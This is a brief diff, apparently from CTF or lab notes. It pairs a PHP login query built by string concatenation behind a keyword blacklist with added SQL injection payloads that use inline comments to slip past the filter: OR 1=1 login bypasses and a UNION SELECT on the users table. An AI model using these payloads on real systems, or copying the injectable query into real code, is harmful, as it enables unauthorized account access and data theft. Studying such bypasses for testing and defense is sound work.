@@ -17,5 +17,10 @@ $password = str_ireplace($blacklist, $replace, $password);
 $sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
 
 'AS INJECTX W/**/HERE 1=1 AND 1=1 LIMIT 1 --
-' O/**/R 1=1 LIMIT 1 --
+' o/**/r 1=1 limit 1; --
+' o/**/r 1=1; --
 * LIMIT 1
+
+1' O/**/R '1' = '1
+
+1' UN/**/ION ALL SEL/**/ECT * FROM users LIMIT 1--
